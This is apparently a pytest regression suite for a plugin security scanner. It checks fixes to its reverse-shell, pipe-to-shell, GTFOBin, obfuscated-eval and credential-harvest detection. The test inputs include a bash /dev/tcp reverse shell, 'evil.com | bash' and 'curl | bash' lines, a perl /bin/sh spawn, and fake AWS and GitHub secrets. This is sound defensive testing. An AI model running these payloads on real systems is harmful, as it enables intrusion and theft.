"""Regression tests for audit batch b01 — scripts/validate_security.py.

Each test pins a bug the full-audit run flagged on validate_security.py and
verifies the corrected behaviour, with a guard that would have re-failed
against the original code. Security fixes are TWO-SIDED: the malicious input
is now caught AND a benign input stays clean.

- HIGH  scan_for_sandbox_escape: a blanket `startswith("skills/")` skip
        discarded EVERY file under skills/ (live SKILL.md / hook.sh / .js),
        so a reverse-shell payload in skills/evil/hook.sh was ignored. Fix:
        skip only genuine `*/references/` template files. Two-sided: a real
        skill reference under skills/<n>/references/*.py stays suppressed.
- HIGH  scan_for_injection pipe-to-shell: a crude `is_python_file and quote
        in line` guard skipped the WHOLE pipe-to-shell check for any Python
        line that merely CONTAINED a quote — so a bare `… | bash` next to an
        unrelated string was suppressed. Fix: rely on the span-precise
        `_match_inside_quoted_span`. Two-sided: an in-string pipe stays clean.
- #14   RC-02 doc-role heading regex matched a stem as a SUBSTRING of any
        word (`note` in `Footnote`), so an attacker could title a section to
        suppress RC-02 injection findings. Fix: leading word-boundary anchor.
- #47   RC-103 disposition INFO line was emitted BEFORE the external scanners
        ran, so its counts ignored every external-scanner finding. Fix: moved
        to the end of validate_security(); only one line, computed from final
        counts.
- #48   scan_for_sandbox_escape markdown-bullet skip suppressed RC-152..156
        in YAML workflow files (`- run: git push --no-verify`). Fix: do not
        apply the markdown-bullet skip to YAML. Two-sided: a markdown doc
        bullet in a .sh file stays suppressed.
- #49/#51 the negation-guard call sites used `content.find(line)` which
        returns the FIRST textual occurrence — a duplicate line resolved to
        the wrong offset and a real GTFOBin finding on the 2nd occurrence was
        suppressed when an earlier identical line sat near a negation word.
        Fix: map by line NUMBER via `_line_abs_offset`. Two-sided: a single
        genuinely-guarded line stays suppressed.
- #50   scan_for_credential_harvest `env=` substring skip let `run-env=` (any
        hyphen/underscore-joined token) defang the check. Fix: argument-
        boundary regex. Two-sided: a real `env=` kwarg stays clean.
- #52   _rc76_is_security_audit_role matched a role keyword as a SUBSTRING of
        a path segment (`review` in `preview`), suppressing RC-76 for
        unrelated skills. Fix: whole-token equality. Two-sided: genuine
        security/audit/review paths still classify as a role.
- #53   RC-70/RC-68 in check_phase2e_extras skipped the fenced-code-block
        guard the other rules apply, firing on decoder+sink EXAMPLES inside a
        markdown ```fence```. Fix: add the fence guard. Two-sided: a real
        obfuscated-exec in actual .js code still fires.
- #54   scan_for_credential_harvest `CLAUDE_PLUGIN_OPTION_` substring skip let
        a trailing comment co-mention defang a real credential write; the
        `process.env.` arm was dead code. Fix: quoted-span gate + dead-code
        removal. Two-sided: a documented placeholder VALUE stays clean.
- #134  the RC-87 semver-context + history-doc guards in check_phase3_all were
        dead code (RC-87 is a Phase 4 rule). Removed; Phase 4's RC-87 path is
        unchanged (semver still suppressed, loopback IP still fires).
- #135  _task_cc_audit gated only on `npx`, so when the persistent `cc-audit`
        binary was present but `npx` absent the step log lied ("SKIPPED / 0
        findings") while cc-audit actually ran. Fix: gate on either launcher.
"""

from __future__ import annotations

import os
import shutil
import sys
import tempfile
from pathlib import Path

# Probes must bypass the scan cache so they exercise live logic.
os.environ.setdefault("CPV_SCAN_CACHE", "0")

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import validate_security as vs  # noqa: E402


def _make_plugin(files: dict[str, str]) -> Path:
    """Create a throwaway plugin tree from {relative_path: content}."""
    root = Path(tempfile.mkdtemp(prefix="cpv_b01_"))
    (root / "plugin.json").write_text(
        '{"name":"t","version":"0.0.1","description":"x"}', encoding="utf-8"
    )
    for rel, content in files.items():
        fp = root / rel
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content, encoding="utf-8")
    return root


def _criticals(report: vs.ValidationReport) -> list[str]:
    return [r.message for r in report.results if r.level == "CRITICAL"]


# ---------------------------------------------------------------------------
# HIGH — scan_for_sandbox_escape blanket skills/ skip discards live scripts
# ---------------------------------------------------------------------------
class TestSandboxEscapeSkillsSkip:
    """skills/<n>/hook.sh is live code; only */references/ is a template."""

    PAYLOAD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nchmod 777 /tmp/x\ngit commit --no-verify"

    def test_live_skill_script_is_scanned(self):
        """A reverse-shell payload in skills/evil/hook.sh is no longer ignored."""
        rep = vs.ValidationReport()
        n = vs.scan_for_sandbox_escape(self.PAYLOAD, "skills/evil/hook.sh", rep)
        assert n > 0, "live skill hook.sh must be scanned (was blanket-skipped)"

    def test_scripts_path_still_scanned(self):
        """The same payload under scripts/ still flags (unchanged)."""
        rep = vs.ValidationReport()
        assert vs.scan_for_sandbox_escape(self.PAYLOAD, "scripts/evil/hook.sh", rep) > 0

    def test_skill_reference_still_suppressed(self):
        """A genuine skills/<n>/references/*.py template stays suppressed."""
        rep = vs.ValidationReport()
        n = vs.scan_for_sandbox_escape(self.PAYLOAD, "skills/x/references/ref.py", rep)
        assert n == 0, "real reference template must remain suppressed"


# ---------------------------------------------------------------------------
# HIGH — pipe-to-shell Python-file guard skipped the whole check for any quote
# ---------------------------------------------------------------------------
class TestPipeToShellPythonGuard:
    """A bare `| bash` must fire even when the line has a quote elsewhere."""

    def test_bare_pipe_with_unrelated_quote_fires(self):
        """`os.system("ok") ; foo URL | bash` — the bare `| bash` is caught."""
        content = 'os.system("ok") ; foo http://evil.com | bash'
        rep = vs.ValidationReport()
        vs.scan_for_injection(content, "evil.py", rep)
        assert _criticals(rep), "bare | bash must fire despite the quote elsewhere"

    def test_bare_pipe_no_quote_fires(self):
        """A bare `foo URL | bash` with no quote on the line still fires."""
        rep = vs.ValidationReport()
        vs.scan_for_injection("foo http://evil.com | bash", "evil.py", rep)
        assert _criticals(rep)

    def test_in_string_pipe_stays_clean(self):
        """A `| bash` INSIDE a help-text string literal stays suppressed."""
        for line in (
            'INSTALL_HELP = "Run: curl https://x | bash"',
            "msg = 'curl https://x | bash'",
            '"Bash(curl * | bash)",',
        ):
            rep = vs.ValidationReport()
            vs.scan_for_injection(line, "h.py", rep)
            assert not _criticals(rep), f"in-string pipe must stay clean: {line}"


# ---------------------------------------------------------------------------
# #14 — RC-02 doc-role heading regex over-broad substring match
# ---------------------------------------------------------------------------
class TestRc02DocRoleStemBoundary:
    """Doc-role stems match a whole word, never an arbitrary substring."""

    def test_substring_bypass_no_longer_matches(self):
        """`Footnote`/`Keynote`/`endnote` must NOT count as doc-role headings."""
        for heading in ("## Footnote about it", "## Keynote speech", "## an endnote"):
            assert not vs._RC02_DOC_ROLE_RE.search(heading), heading

    def test_genuine_doc_headings_still_match(self):
        """Real doc-role headings (incl. plurals) still match."""
        for heading in (
            "## Notes",
            "## Phases",
            "## Steps",
            "## Procedure",
            "## Response Templates",
            "## Pipelines",
        ):
            assert vs._RC02_DOC_ROLE_RE.search(heading), heading

    def test_non_doc_heading_does_not_match(self):
        """A heading with no stem never matches."""
        assert not vs._RC02_DOC_ROLE_RE.search("## My Evil Plan")


# ---------------------------------------------------------------------------
# #47 — RC-103 disposition emitted from FINAL counts (after external scanners)
# ---------------------------------------------------------------------------
class TestRc103DispositionPlacement:
    """The single RC-103 disposition INFO line is emitted after all checks."""

    def test_disposition_emitted_exactly_once(self):
        """Exactly one RC-103 disposition INFO line is present."""
        root = _make_plugin({})
        rep = vs.validate_security(root)
        disp = [r for r in rep.results if "RC-103 disposition" in r.message]
        assert len(disp) == 1, disp

    def test_disposition_is_after_skillaudit_step(self):
        """The disposition line is the LAST RC-* INFO line (post external scan).

        The disposition counts are computed from report.results at the very end
        of validate_security(), so any external-scanner / SkillAudit finding is
        already counted. We assert the line is positioned after the last
        non-disposition result was appended.
        """
        root = _make_plugin({})
        rep = vs.validate_security(root)
        idx = next(
            i for i, r in enumerate(rep.results) if "RC-103 disposition" in r.message
        )
        # No result added AFTER the disposition line.
        assert idx == len(rep.results) - 1, "disposition must be the final result"


# ---------------------------------------------------------------------------
# #48 — markdown-bullet skip suppressed RC-152..156 in YAML workflows
# ---------------------------------------------------------------------------
class TestSandboxEscapeYamlBullet:
    """YAML `- run: …` is a live sequence item, not a markdown doc bullet."""

    YAML = (
        "name: ci\non: [push]\njobs:\n  build:\n    steps:\n"
        "      - run: git push --no-verify\n"
        "      - run: chmod 777 /tmp/x\n"
    )

    def test_yaml_workflow_step_is_flagged(self):
        """A malicious `- run:` step in a workflow YAML now flags RC-152/155."""
        rep = vs.ValidationReport()
        n = vs.scan_for_sandbox_escape(self.YAML, ".github/workflows/ci.yml", rep)
        assert n >= 2, [r.message for r in rep.results]

    def test_markdown_bullet_in_shell_still_suppressed(self):
        """A markdown-style doc bullet in a .sh file stays suppressed."""
        rep = vs.ValidationReport()
        n = vs.scan_for_sandbox_escape(
            "- this documents git push --no-verify usage\n", "scripts/notes.sh", rep
        )
        assert n == 0


# ---------------------------------------------------------------------------
# #49 / #51 — content.find(line) duplicate-line offset bug at negation guards
# ---------------------------------------------------------------------------
class TestNegationGuardDuplicateLine:
    """A real finding on a duplicate line is not suppressed by an earlier one."""

    GTFO = "perl -e 'system(\"/bin/sh\")'"

    def test_duplicate_line_second_occurrence_fires(self):
        """The 2nd (unguarded) copy of a GTFOBin line is flagged.

        occ #1 is preceded by 'never' (guarded); occ #2 is a bare threat. With
        the old content.find(line) bug occ #2 resolved to occ #1's offset and
        the negation guard wrongly suppressed it.
        """
        content = (
            "# never run the following:\n"
            f"{self.GTFO}\n"
            "echo padding a\n"
            "echo padding b\n"
            f"{self.GTFO}\n"
        )
        root = _make_plugin({"hooks/evil.sh": content})
        rep = vs.ValidationReport()
        vs.check_phase1_supply_chain_rules(root, rep)
        rc37 = [r for r in rep.results if "RC-37" in r.message]
        assert any(r.line == 5 for r in rc37), [(r.line, r.message[:40]) for r in rc37]

    def test_genuinely_guarded_single_line_stays_suppressed(self):
        """A single line genuinely near a negation word stays suppressed."""
        root = _make_plugin({"hooks/x.sh": f"# never run: {self.GTFO}\n"})
        rep = vs.ValidationReport()
        vs.check_phase1_supply_chain_rules(root, rep)
        assert not [r for r in rep.results if "RC-37" in r.message]

    def test_line_abs_offset_matches_manual_sum(self):
        """`_line_abs_offset` returns the true start offset of each line."""
        lines = ["alpha", "beta", "gamma", "alpha"]
        running = 0
        for i, ln in enumerate(lines, start=1):
            assert vs._line_abs_offset(lines, i) == running
            running += len(ln) + 1


# ---------------------------------------------------------------------------
# #50 — scan_for_credential_harvest `env=` substring skip too broad
# ---------------------------------------------------------------------------
class TestCredentialHarvestEnvSubstring:
    """`env=` is a kwarg at an arg boundary, not a substring of `run-env=`."""

    SECRET = 'AWS_SECRET_ACCESS_KEY="AKIAIOSFODNN7EXAMPLEKEY"'

    def test_run_env_token_does_not_suppress(self):
        """A real secret next to `run-env=prod` is no longer suppressed."""
        rep = vs.ValidationReport()
        n = vs.scan_for_credential_harvest(
            self.SECRET + " ; run-env=prod\n", "scripts/deploy.sh", rep
        )
        assert n > 0

    def test_real_env_kwarg_stays_clean(self):
        """A genuine `env=` kwarg (subprocess/click) stays suppressed."""
        for line in (
            'subprocess.run(["aws"], env={"AWS_SECRET_ACCESS_KEY": v})',
            'click.option("--token", env="GITHUB_TOKEN")',
        ):
            rep = vs.ValidationReport()
            n = vs.scan_for_credential_harvest(line + "\n", "scripts/x.py", rep)
            assert n == 0, line


# ---------------------------------------------------------------------------
# #52 — _rc76_is_security_audit_role substring match on path segments
# ---------------------------------------------------------------------------
class TestRc76SecurityAuditRoleToken:
    """Role keywords match a whole path token, never a substring."""

    def test_substring_paths_are_not_roles(self):
        """`preview`/`threatening`/`exploitation` are not security-audit roles."""
        for p in (
            "skills/my-preview-skill/SKILL.md",
            "skills/threatening-content/x.md",
            "skills/exploitation-demo/x.md",
        ):
            assert not vs._rc76_is_security_audit_role(p), p

    def test_genuine_role_paths_classify(self):
        """Real security/audit/review/owasp/pentest paths still classify."""
        for p in (
            "agents/caa-security-review-agent.md",
            "skills/plugin-security-audit/SKILL.md",
            "skills/owasp-top10/x.md",
            "skills/pentest-toolkit/x.md",
            "docs/SECURITY.md",
        ):
            assert vs._rc76_is_security_audit_role(p), p


# ---------------------------------------------------------------------------
# #53 — RC-70 / RC-68 skipped the fenced-code-block guard
# ---------------------------------------------------------------------------
class TestObfuscatedExecFenceGuard:
    """An obfuscated-exec EXAMPLE inside a markdown fence is documentation."""

    FENCED_DOC = (
        "# Notes\n\n```javascript\n"
        'const payload = atob("ZG9jdW1lbnQ=");\n'
        "eval(payload);\n"
        "```\n"
    )
    REAL_JS = 'const payload = atob("ZG9jdW1lbnQ=");\neval(payload);\n'

    def test_fenced_doc_example_suppressed(self):
        """RC-70/RC-68 no longer fire on a fenced decoder+sink doc example."""
        root = _make_plugin({"README.md": self.FENCED_DOC})
        rep = vs.ValidationReport()
        vs.check_phase2e_extras(root, rep)
        assert not [r for r in rep.results if "RC-70" in r.message or "RC-68" in r.message]

    def test_real_obfuscated_exec_in_code_fires(self):
        """A real obfuscated-exec in actual .js code still fires RC-70."""
        root = _make_plugin({"hooks/evil.js": self.REAL_JS})
        rep = vs.ValidationReport()
        vs.check_phase2e_extras(root, rep)
        assert [r for r in rep.results if "RC-70" in r.message]


# ---------------------------------------------------------------------------
# #54 — CLAUDE_PLUGIN_OPTION_ substring skip + process.env. dead code
# ---------------------------------------------------------------------------
class TestCredentialHarvestClaudeOption:
    """A placeholder must be the quoted VALUE, not a bare co-mention."""

    def test_comment_comention_does_not_suppress(self):
        """A real token with a trailing CLAUDE_PLUGIN_OPTION_ comment fires."""
        line = 'GITHUB_TOKEN="ghp_real1234567890ABCDEFghijKLmnopQRs" # see CLAUDE_PLUGIN_OPTION_FOO'
        rep = vs.ValidationReport()
        n = vs.scan_for_credential_harvest(line + "\n", "scripts/x.sh", rep)
        assert n > 0

    def test_documented_placeholder_value_stays_clean(self):
        """A documented placeholder VALUE inside quotes stays suppressed."""
        rep = vs.ValidationReport()
        n = vs.scan_for_credential_harvest(
            'OPENROUTER_API_KEY: "CLAUDE_PLUGIN_OPTION_OPENROUTER_KEY"\n', "scripts/x.sh", rep
        )
        assert n == 0

    def test_process_env_mapping_still_clean(self):
        """A `process.env.` env-var mapping line stays suppressed (api-list)."""
        rep = vs.ValidationReport()
        n = vs.scan_for_credential_harvest(
            '"AWS_SECRET_ACCESS_KEY": process.env.AWS_SECRET_ACCESS_KEY\n', "scripts/x.js", rep
        )
        assert n == 0


# ---------------------------------------------------------------------------
# #134 — dead RC-87 guards removed from check_phase3_all (Phase 4 path intact)
# ---------------------------------------------------------------------------
class TestRc87Phase4Intact:
    """RC-87 is a Phase 4 rule; its semver/loopback handling is unaffected."""

    def test_semver_in_manifest_suppressed(self):
        """A semver dep string in package.json stays suppressed (Phase 4)."""
        root = _make_plugin({"package.json": '{"dependencies": {"@types/node": "^10.0.5"}}'})
        rep = vs.ValidationReport()
        vs.check_phase4_all(root, rep)
        assert not [r for r in rep.results if "RC-87" in r.message]

    def test_loopback_ip_in_live_shell_fires(self):
        """A loopback IP in a live .sh script still fires RC-87 (Phase 4)."""
        root = _make_plugin({"hooks/x.sh": "curl http://127.0.0.1:8080/admin\n"})
        rep = vs.ValidationReport()
        vs.check_phase4_all(root, rep)
        assert [r for r in rep.results if "RC-87" in r.message]

    def test_phase3_loop_has_no_rc87_branch(self):
        """check_phase3_all no longer CALLS the dead RC-87 guards (Phase 4 does).

        Asserts the helper CALL forms (`_rc87_is_semver_context(` /
        `_rc87_is_history_doc(`) are gone from check_phase3_all while still
        present in check_phase4_all — a prose mention in a comment cannot
        satisfy a `(`-suffixed call substring, so this is unambiguous.
        """
        import inspect

        p3 = inspect.getsource(vs.check_phase3_all)
        p4 = inspect.getsource(vs.check_phase4_all)
        assert "_rc87_is_semver_context(" not in p3
        assert "_rc87_is_history_doc(" not in p3
        assert "if rule_id == \"RC-87\"" not in p3
        assert "_rc87_is_semver_context(" in p4
        assert "_rc87_is_history_doc(" in p4


# ---------------------------------------------------------------------------
# #135 — cc-audit step log gate must honour the persistent binary
# ---------------------------------------------------------------------------
class TestCcAuditLauncherGate:
    """The cc-audit 'can run' gate matches check_cc_audit (binary OR npx)."""

    def test_persistent_binary_counts_as_runnable(self, monkeypatch):
        """With `cc-audit` present but no `npx`, the gate must say runnable.

        This mirrors the corrected gate inside _task_cc_audit
        (`which("cc-audit") or which("npx")`) and confirms it agrees with
        check_cc_audit's own launcher resolution.
        """
        available = {"cc-audit"}  # persistent binary present, npx absent
        monkeypatch.setattr(
            shutil,
            "which",
            lambda name, *a, **k: ("/usr/local/bin/" + name) if name in available else None,
        )
        gate_runnable = bool(shutil.which("cc-audit") or shutil.which("npx"))
        cc_audit_resolves = bool(shutil.which("cc-audit") or shutil.which("npx"))
        assert gate_runnable is True
        assert gate_runnable == cc_audit_resolves

    def test_neither_launcher_is_not_runnable(self, monkeypatch):
        """With neither launcher present, the gate is not runnable."""
        monkeypatch.setattr(shutil, "which", lambda name, *a, **k: None)
        assert bool(shutil.which("cc-audit") or shutil.which("npx")) is False
